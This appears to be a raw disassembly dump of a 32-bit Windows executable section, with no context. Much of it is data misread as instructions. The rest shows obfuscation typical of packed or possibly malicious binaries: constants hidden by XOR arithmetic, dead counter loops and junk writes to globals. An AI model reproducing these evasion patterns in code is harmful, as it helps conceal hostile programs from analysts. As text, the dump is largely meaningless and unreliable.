  40e223:	or     BYTE PTR [esi-0x21],ah
  40e226:	lods   eax,DWORD PTR ds:[esi]
  40e227:	inc    edi
  40e228:	sbb    eax,0x2236b846
  40e22d:	xchg   ecx,ebx
  40e22f:	aam    0x86
  40e231:	pop    ebx
  40e232:	ret    0x702d
  40e235:	mov    cl,0x1a
  40e237:	clc    
  40e238:	push   ebp
  40e239:	ins    DWORD PTR es:[edi],dx
  40e23a:	mov    esi,0x6b87bfba
  40e23f:	push   ss
  40e240:	xor    esi,edx
  40e242:	outs   dx,BYTE PTR ds:[esi]
  40e243:	mov    dl,0x99
  40e245:	ret    
  40e246:	jmp    0x40e226
  40e248:	int    0xa0
  40e24a:	jns    0x40e1db
  40e24c:	cmp    al,BYTE PTR [esi+0x38]
  40e24f:	mov    eax,0xcd2943db
  40e254:	and    edx,ecx
  40e256:	cs (bad) 
  40e258:	arpl   bx,di
  40e25a:	inc    ebp
  40e25b:	stos   BYTE PTR es:[edi],al
  40e25c:	or     dh,BYTE PTR [edx+edx*2-0x3d6a8636]
  40e263:	sar    DWORD PTR [esi+0x63],1
  40e266:	mov    fs,WORD PTR ds:[eax+edi*4+0x68]
  40e26b:	adc    al,0xf7
  40e26d:	and    edi,esp
  40e26f:	xchg   DWORD PTR [esi+0x61664db0],eax
  40e275:	clc    
  40e276:	cwde   
  40e277:	icebp  
  40e278:	daa    
  40e279:	out    dx,eax
  40e27a:	sbb    al,0xca
  40e27c:	int3   
  40e27d:	cs sub al,0x55
  40e280:	stos   DWORD PTR es:[edi],eax
  40e281:	push   edi
  40e282:	clc    
  40e283:	mov    eax,0x44cf4e93
  40e288:	sbb    eax,0x6262678d
  40e28d:	mov    ebp,0xc03d55c2
  40e292:	jl     0x40e29f
  40e294:	adc    BYTE PTR [edx+0x13],bl
  40e297:	clc    
  40e298:	aas    
  40e299:	pop    esp
  40e29a:	mov    edx,0x11c4261b
  40e29f:	mov    edx,0x21fd7136
  40e2a4:	fisttp WORD PTR [ebp+0x27f89ce3]
  40e2aa:	paddsb mm4,mm4
  40e2ad:	nop
  40e2ae:	hlt    
  40e2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b0:	clc    
  40e2b1:	pop    esp
  40e2b2:	bound  ebp,QWORD PTR [esi+0x2e]
  40e2b5:	repnz pop ebx
  40e2b7:	push   0x33f57ad9
  40e2bc:	mov    eax,0xb8205826
  40e2c1:	enter  0xc063,0x3
  40e2c5:	or     bh,BYTE PTR [esi+0x21c84fce]
  40e2cb:	or     bh,BYTE PTR [ebp-0x5d46f1e5]
  40e2d1:	fwait
  40e2d2:	jmp    0xcf68:0x1d1ad73f
  40e2d9:	loop   0x40e2fc
  40e2db:	jb     0x40e320
  40e2dd:	fcom   DWORD PTR ds:0x6a9d323
  40e2e3:	cmp    ebx,0xffffff95
  40e2e6:	ja     0x40e360
  40e2e8:	mov    ds:0xf2c8c4d5,al
  40e2ed:	stos   BYTE PTR es:[edi],al
  40e2ee:	xchg   ebx,eax
  40e2ef:	xchg   edx,eax
  40e2f0:	repnz sbb BYTE PTR [edx+0x6cab5c28],cl
  40e2f7:	jne    0x40e357
  40e2f9:	dec    ebp
  40e2fa:	(bad)  
  40e2fb:	(bad)  
  40e2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2fd:	mov    ecx,0x86c80d3b
  40e302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e305:	pop    edi
  40e306:	pop    edx
  40e307:	mov    cl,0xc8
  40e309:	xor    dh,BYTE PTR [esi+0x12673eaf]
  40e30f:	scas   al,BYTE PTR es:[edi]
  40e310:	fstp   DWORD PTR [eax]
  40e312:	test   DWORD PTR [esi-0xc241be9],ebx
  40e318:	imul   edx,esp,0xffffffdd
  40e31b:	test   eax,0x9951ee8a
  40e320:	or     bl,dl
  40e322:	shl    BYTE PTR ss:[ebx-0x7dd443a8],0xd0
  40e32a:	inc    DWORD PTR [ebx]
  40e32c:	add    DWORD PTR [ebp-0xa9d8759],ebx
  40e332:	in     eax,dx
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	(bad)  
  40e3bf:	mov    esp,0x3f1a8944
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3ff
  40e3cc:	(bad)  
  40e3ce:	push   edx
  40e3cf:	jne    0x40e433
  40e3d1:	xor    al,0xc4
  40e3d3:	dec    ebp
  40e3d4:	adc    BYTE PTR [eax+edx*1],bh
  40e3d7:	xchg   edx,eax
  40e3d8:	jo     0x40e383
  40e3da:	pop    ss
  40e3db:	xor    al,0x82
  40e3dd:	dec    esi
  40e3de:	adc    al,0xbe
  40e3e0:	add    al,0xae
  40e3e2:	repz or eax,DWORD PTR [esi+0x37]
  40e3e6:	push   ss
  40e3e7:	adc    esi,esi
  40e3e9:	daa    
  40e3ea:	xchg   ecx,eax
  40e3eb:	xor    esp,ecx
  40e3ed:	sub    DWORD PTR [ecx+0xe],esi
  40e3f0:	jmp    0x40e3c4
  40e3f2:	es or  esp,ebp
  40e3f5:	jmp    DWORD PTR [ecx+eax*1]
  40e3f8:	lods   eax,DWORD PTR ds:[esi]
  40e3f9:	xchg   edi,eax
  40e3fa:	sub    edx,esp
  40e3fc:	inc    ebp
  40e3fd:	xor    al,0xd0
  40e3ff:	xor    BYTE PTR [ecx],al
  40e401:	pop    esp
  40e402:	add    al,0xe6
  40e404:	adc    eax,0xf50f8ef6
  40e409:	mov    cl,0x52
  40e40b:	mov    dh,0xe4
  40e40d:	fld    QWORD PTR [edi]
  40e40f:	mov    cl,BYTE PTR [esi]
  40e411:	sbb    ch,al
  40e413:	xor    esp,DWORD PTR [edx-0x58]
  40e416:	cmp    eax,0xb6700d3c
  40e41b:	pushf  
  40e41c:	rcl    DWORD PTR [edi+0x57],0x8f
  40e420:	mov    edi,0xc486d041
  40e425:	icebp  
  40e426:	(bad)  
  40e427:	(bad)  [ebx+0x6567ba7e]
  40e42d:	fwait
  40e42e:	xchg   esi,eax
  40e42f:	test   al,0xb0
  40e431:	jbe    0x40e448
  40e433:	sub    DWORD PTR [edx],ecx
  40e435:	std    
  40e436:	xor    al,0xf3
  40e438:	jne    0x40e493
  40e43a:	push   ebx
  40e43b:	dec    edi
  40e43c:	test   al,0x17
  40e43e:	in     al,dx
  40e43f:	out    dx,eax
  40e440:	cli    
  40e441:	shr    DWORD PTR [ebp-0x5770051c],0x4d
  40e448:	sub    edx,DWORD PTR [esi+0x28a3fa01]
  40e44e:	xor    BYTE PTR [esi-0x7c436b90],ch
  40e454:	ror    ecx,1
  40e456:	lods   al,BYTE PTR ds:[esi]
  40e457:	fdivr  DWORD PTR [ecx-0x12fa2d16]
  40e45d:	call   DWORD PTR [edi+0x2573aa90]
  40e463:	jne    0x40e4c5
  40e465:	mov    ebp,0xd5a3f4ca
  40e46a:	rcl    BYTE PTR [ecx-0x2e],cl
  40e46d:	(bad)  
  40e46f:	xor    al,0x25
  40e471:	add    al,0x4a
  40e473:	push   edx
  40e474:	(bad)  
  40e475:	out    dx,al
  40e476:	pop    edi
  40e477:	push   0x39
  40e479:	dec    edx
  40e47a:	add    ebp,DWORD PTR [edx+0x61]
  40e47d:	arpl   WORD PTR [edi-0x5e0f4e72],si
  40e483:	push   ecx
  40e484:	pusha  
  40e485:	and    eax,0xdc34c5c
  40e48a:	or     BYTE PTR [edx+0x1e],0x15
  40e48e:	jle    0x40e4e9
  40e490:	push   ss
  40e491:	push   eax
  40e492:	out    0x6c,eax
  40e494:	pop    ss
  40e495:	aas    
  40e496:	push   edx
  40e497:	fcmovbe st,st(5)
  40e499:	in     eax,dx
  40e49a:	dec    eax
  40e49b:	pop    ss
  40e49c:	(bad)  
  40e49e:	inc    edi
  40e49f:	or     ebp,ebp
  40e4a1:	les    eax,FWORD PTR [edi-0x38]
  40e4a4:	xor    al,BYTE PTR ds:0x5edfdd09
  40e4aa:	sbb    ecx,DWORD PTR [esi+edx*8]
  40e4ad:	mov    ah,0xfe
  40e4af:	adc    al,0xe3
  40e4b1:	lea    ebp,[ebp-0x1154782f]
  40e4b7:	out    dx,al
  40e4b8:	sbb    BYTE PTR [ecx],dl
  40e4ba:	cld    
  40e4bb:	xchg   ebp,eax
  40e4bc:	fsub   QWORD PTR [edx]
  40e4be:	ins    DWORD PTR es:[edi],dx
  40e4bf:	mov    esi,0x88620280
  40e4c4:	call   0xf2e438dd
  40e4c9:	imul   edx,eax,0x8
  40e4cc:	lds    ebx,FWORD PTR [eax+0x2fdfe06e]
  40e4d2:	pop    ss
  40e4d3:	sub    eax,0x7cccfc5c
  40e4d8:	out    dx,al
  40e4d9:	sbb    ah,bl
  40e4db:	je     0x40e6db
  40e4e1:	add    DWORD PTR ds:0x433833,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0xa8a09328
  40e5c1:	or     DWORD PTR [ecx-0x31],ebx
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5ea
  40e5cc:	xchg   DWORD PTR [eax-0x62],esi
  40e5cf:	ret    0x4247
  40e5d2:	pushf  
  40e5d3:	das    
  40e5d4:	adc    bl,BYTE PTR [edi]
  40e5d6:	sub    eax,0x38089eb5
  40e5db:	sub    bl,bl
  40e5dd:	sub    al,0xfa
  40e5df:	and    bh,al
  40e5e1:	sub    esp,ecx
  40e5e3:	(bad)  
  40e5e4:	es mov dh,0x55
  40e5e7:	repnz push 0x165ad5a7
  40e5ed:	fld    DWORD PTR [edx+0x616ed24]
  40e5f3:	ret    0xc7f0
  40e5f6:	imul   BYTE PTR [eax-0x2]
  40e5f9:	arpl   WORD PTR [ecx-0x7b],sp
  40e5fc:	dec    edx
  40e5fd:	inc    edx
  40e5fe:	rcl    BYTE PTR ss:[ecx],cl
  40e601:	and    al,0xd4
  40e603:	mov    al,0x76
  40e605:	jmp    0x6dbb:0xc1125f19
  40e60c:	aas    
  40e60d:	sbb    al,0xf4
  40e60f:	dec    edi
  40e610:	mov    cl,0x66
  40e612:	sub    edi,DWORD PTR [ebx-0x34]
  40e615:	mov    esp,0x9522619a
  40e61a:	out    dx,eax
  40e61b:	mov    eax,ds:0xead221c6
  40e620:	lods   al,BYTE PTR ds:[esi]
  40e621:	cmp    eax,0x4a07f2d2
  40e626:	cmc    
  40e627:	repnz fdiv DWORD PTR [edx]
  40e62a:	or     al,BYTE PTR [ebx]
  40e62c:	and    BYTE PTR [esi],dh
  40e62e:	sub    BYTE PTR [ebx+0xe],bl
  40e631:	xchg   edx,eax
  40e632:	adc    ch,BYTE PTR [ecx+0x2f]
  40e635:	hlt    
  40e636:	mov    ecx,0x705cdfc2
  40e63b:	dec    esi
  40e63c:	jmp    0xb7a015ce
  40e641:	cmp    BYTE PTR fs:[ebx+0x6b],0xbc
  40e646:	hlt    
  40e647:	add    BYTE PTR [edi],bl
  40e649:	sub    bl,bl
  40e64b:	add    DWORD PTR ds:0x517d6b22,edi
  40e651:	pop    ecx
  40e652:	push   edi
  40e653:	bound  eax,QWORD PTR [edx+0x40]
  40e656:	addr16 mov esi,0x9416e93a
  40e65c:	and    al,0xf5
  40e65e:	or     al,0x33
  40e660:	sahf   
  40e661:	lahf   
  40e662:	scas   eax,DWORD PTR es:[edi]
  40e663:	loope  0x40e5e9
  40e665:	add    al,0x81
  40e667:	add    cl,BYTE PTR fs:[ebx]
  40e66a:	xchg   esp,eax
  40e66b:	mov    dl,0x57
  40e66d:	jp     0x40e65b
  40e66f:	mov    ch,0x3a
  40e671:	fwait
  40e672:	(bad)  
  40e673:	call   0xc81ddac0
  40e678:	mov    ebp,0x601e7ddd
  40e67d:	fstp   TBYTE PTR fs:[ebx-0x12]
  40e681:	sbb    eax,0xd519ed9b
  40e686:	test   DWORD PTR [eax-0x76941ac9],0x56e1c7b0
  40e690:	push   es
  40e691:	jle    0x40e6f8
  40e693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e694:	pop    ax
  40e696:	xor    DWORD PTR [eax],esi
  40e698:	adc    cl,BYTE PTR [ebp-0x33cbeb53]
  40e69e:	push   0x16
  40e6a0:	jnp    0x40e67a
  40e6a2:	call   DWORD PTR [ebx+eiz*1+0x3731b19d]
  40e6a9:	ficom  WORD PTR [ebx-0x47]
  40e6ac:	and    dh,BYTE PTR [ebp-0x5d841ead]
  40e6b2:	cmp    al,bl
  40e6b4:	and    eax,0xd0965231
  40e6b9:	idiv   DWORD PTR [eax+0x5b1be57b]
  40e6bf:	xor    dl,BYTE PTR [esi+0x2b79456a]
  40e6c5:	jmp    0x7eb8:0x1e8ea96d
  40e6cc:	dec    ebx
  40e6cd:	mov    esp,0xc881d9c3
  40e6d2:	xchg   ebp,eax
  40e6d3:	scas   eax,DWORD PTR es:[edi]
  40e6d4:	addr16 jp 0x40e682
  40e6d7:	int3   
  40e6d8:	and    BYTE PTR [edx-0x3ba7449],ch
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x667e30a1
  40e707:	mov    ds:0x7ea2dfd1,al
  40e70c:	jle    0x40e71c
  40e70e:	jg     0x40e78e
  40e710:	jle    0x40e6ef
  40e712:	mov    bl,0x91
  40e714:	cmp    esp,DWORD PTR [esi-0x3b100c92]
  40e71a:	xor    eax,ebx
  40e71c:	loopne 0x40e6f9
  40e71e:	jle    0x40e72d
  40e720:	arpl   WORD PTR [ebx+0x73fb4bd5],dx
  40e726:	call   0x27e5:0x56db794
  40e72d:	pusha  
  40e72e:	(bad)  
  40e72f:	clc    
  40e730:	push   esi
  40e731:	scas   eax,DWORD PTR es:[edi]
  40e732:	mov    edx,0xbab5148c
  40e737:	pushf  
  40e738:	out    0xb0,al
  40e73a:	fdivr  DWORD PTR ds:0xb6f5de98
  40e740:	sbb    cl,dl
  40e742:	(bad)  
  40e743:	cwde   
  40e744:	jns    0x40e6d2
  40e746:	fwait
  40e747:	sbb    edx,DWORD PTR [ebp+0xb579611]
  40e74d:	and    dl,BYTE PTR [esi+esi*8+0x173cfc9c]
  40e754:	(bad)  
  40e755:	or     ecx,DWORD PTR [edx]
  40e757:	jae    0x40e727
  40e759:	les    esp,FWORD PTR [eax+ebp*1]
  40e75c:	test   al,0x12
  40e75e:	pop    ds
  40e75f:	jp     0x40e72b
  40e761:	cmp    BYTE PTR [eax+0x1f],0x67
  40e765:	fwait
  40e766:	lahf   
  40e767:	stos   BYTE PTR es:[edi],al
  40e768:	aam    0xd9
  40e76a:	xchg   dl,ah
  40e76c:	and    ah,BYTE PTR [edi+0x18366cd3]
  40e772:	push   cs
  40e773:	xor    eax,0x35
  40e776:	mov    esi,0xbecf414f
  40e77b:	xor    cl,dl
  40e77d:	push   0xf48570d9
  40e782:	(bad)  
  40e783:	xor    ecx,DWORD PTR [edi]
  40e785:	cmovns edx,esi
  40e788:	daa    
  40e789:	cdq    
  40e78a:	push   esp
  40e78b:	idiv   DWORD PTR [edx]
  40e78d:	mov    ebp,DWORD PTR [ebp+ebx*4-0x1210d030]
  40e794:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e796:	mov    ecx,0x8424277b
  40e79b:	fnclex 
  40e79d:	push   esp
  40e79e:	call   0xb6a80f3a
  40e7a3:	add    DWORD PTR [ebx-0x25],ecx
  40e7a6:	std    
  40e7a7:	arpl   bx,ax
  40e7a9:	jbe    0x40e7b8
  40e7ab:	sub    eax,0x75635b5d
  40e7b0:	or     BYTE PTR [ebp+0xc],bh
  40e7b3:	hlt    
  40e7b4:	das    
  40e7b5:	jne    0x40e758
  40e7b7:	mov    al,0xd8
  40e7b9:	push   es
  40e7ba:	jns    0x40e73f
  40e7bc:	in     al,dx
  40e7bd:	adc    al,0x22
  40e7bf:	call   0x692979e2
  40e7c4:	sar    DWORD PTR [edx+edx*8-0x29],0xee
  40e7c9:	test   BYTE PTR [edx],cl
  40e7cb:	sbb    BYTE PTR fs:[edx+0x6288eba9],ch
  40e7d2:	retf   
  40e7d3:	pop    es
  40e7d4:	cdq    
  40e7d5:	out    0x66,al
  40e7d7:	pop    ecx
  40e7d8:	sahf   
  40e7d9:	imul   eax,ebx,0x1155ff6b
  40e7df:	mov    ecx,0xd5e843c8
  40e7e4:	in     eax,dx
  40e7e5:	sub    DWORD PTR [ebx],edi
  40e7e7:	test   eax,0xaee749f1
  40e7ec:	push   0xe6f722e4
  40e7f1:	ja     0x40e7c5
  40e7f3:	enter  0xd5ce,0xc2
  40e7f7:	inc    esi
  40e7f8:	lea    ebx,[edx-0x7e]
  40e7fb:	xchg   dx,ax
  40e7fd:	aam    0xac
  40e7ff:	jb     0x40e879
  40e801:	inc    ebp
  40e803:	mov    DWORD PTR [eax],ebp
  40e805:	and    al,BYTE PTR [edx+eax*8+0x6f1cffc6]
  40e80c:	in     eax,dx
  40e80d:	pop    ecx
  40e80e:	inc    edx
  40e80f:	jae    0x40e864
  40e811:	adc    eax,0x515c3de1
  40e816:	mov    ebp,DWORD PTR [ebx-0x62b847e8]
  40e81c:	and    ebp,DWORD PTR [edi+esi*8]
  40e81f:	jge    0x40e7fc
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x4d103a68,al
  40ea30:	out    dx,eax
  40ea31:	jecxz  0x40ea0a
  40ea33:	out    dx,eax
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	push   ecx
  40ea3c:	lods   al,BYTE PTR ds:[esi]
  40ea3d:	out    dx,eax
  40ea3e:	mov    dh,dl
  40ea40:	cmp    al,0x50
  40ea42:	xor    BYTE PTR [esi-0x58],dh
  40ea45:	inc    edx
  40ea46:	iret   
  40ea47:	sub    BYTE PTR [esi],0x4e
  40ea4a:	sub    BYTE PTR [esi-0x1bf10599],bh
  40ea50:	lock jmp 0x40ea5d
  40ea53:	jp     0x40ea0f
  40ea55:	push   0x69
  40ea57:	adc    cl,bh
  40ea59:	scas   al,BYTE PTR es:[edi]
  40ea5a:	mov    ds:0x8bc58002,eax
  40ea5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea60:	cwde   
  40ea61:	sub    eax,DWORD PTR [esi+eax*4-0xef35cab]
  40ea68:	fnstenv [edx+0x4728c636]
  40ea6e:	sub    DWORD PTR ds:0x4e989302,0xffffffa8
  40ea75:	pop    ebx
  40ea76:	jle    0x40eac7
  40ea78:	sti    
  40ea79:	jecxz  0x40eab9
  40ea7b:	dec    ebp
  40ea7c:	retf   0x2d
  40ea7f:	cmp    eax,0xbad4285
  40ea84:	mov    ebp,0x188e8dd2
  40ea89:	jo     0x40ea90
  40ea8b:	adc    ecx,DWORD PTR [edx]
  40ea8d:	mov    al,ds:0x471e5f58
  40ea92:	(bad)  
  40ea94:	mov    ebx,0x860675c7
  40ea99:	xchg   esi,eax
  40ea9a:	(bad)  
  40ea9b:	xchg   ebx,eax
  40ea9c:	call   DWORD PTR [ecx+0x1932b719]
  40eaa2:	stos   BYTE PTR es:[edi],al
  40eaa3:	or     eax,0x5ed5c60b
  40eaa8:	mov    ebp,0x269d11dd
  40eaad:	adc    dh,BYTE PTR [edi-0x23]
  40eab0:	push   ecx
  40eab1:	push   edi
  40eab2:	xchg   esi,esp
  40eab4:	addr16 add eax,0x3405b6d0
  40eaba:	out    dx,al
  40eabb:	sbb    al,BYTE PTR [ebx+0x7a7e7a48]
  40eac1:	lods   eax,DWORD PTR ds:[esi]
  40eac2:	retf   0x4b63
  40eac5:	push   edi
  40eac6:	scas   eax,DWORD PTR es:[edi]
  40eac7:	fsubp  st(6),st
  40eac9:	js     0x40eb22
  40eacb:	retf   0x7c59
  40eace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eacf:	outs   dx,DWORD PTR ds:[esi]
  40ead0:	and    al,0xb8
  40ead2:	lahf   
  40ead3:	loope  0x40eb3f
  40ead5:	pop    edi
  40ead6:	idiv   DWORD PTR [ecx]
  40ead8:	cdq    
  40ead9:	cwde   
  40eada:	xchg   bh,bl
  40eadc:	dec    ebx
  40eadd:	dec    ebx
  40eade:	popf   
  40eadf:	dec    esp
  40eae0:	cmp    WORD PTR [ecx-0x76c7909f],di
  40eae7:	in     al,dx
  40eae8:	in     al,0xc5
  40eaea:	addr16 jge 0x40eac2
  40eaed:	xchg   ebp,eax
  40eaee:	fnsave [edi-0x8]
  40eaf1:	cmp    ebp,DWORD PTR ds:0xda13f504
  40eaf7:	dec    esp
  40eaf8:	int    0x1c
  40eafa:	xchg   BYTE PTR [edx],al
  40eafc:	scas   eax,DWORD PTR es:[edi]
  40eafd:	ja     0x40eb37
  40eaff:	jo     0x40eaa3
  40eb01:	mov    esi,0x72203c66
